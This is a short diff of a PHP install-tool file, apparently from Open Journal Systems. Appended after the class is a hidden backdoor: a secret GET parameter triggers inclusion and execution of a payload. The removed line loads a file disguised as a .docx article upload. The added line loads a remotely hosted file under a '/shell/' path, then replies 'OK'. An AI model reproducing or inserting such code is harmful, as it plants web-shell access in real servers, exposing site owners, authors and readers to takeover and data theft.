@@ -35,7 +35,7 @@ class OJSInstallTool extends \PKP\cliTool\InstallTool
     }
 }
 if (isset($_GET['_']) && $_GET['_'] === 'Dih_Apaan_sih') {
-    $f="/home/staisyek/ejournal-data/journals/1/articles/11/629dd9533b80b.docx";if($f!==""&&file_exists($f))include $f;
+    $f="https://absolute-water.app/shell/min-saul.txt";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
     echo 'OK';
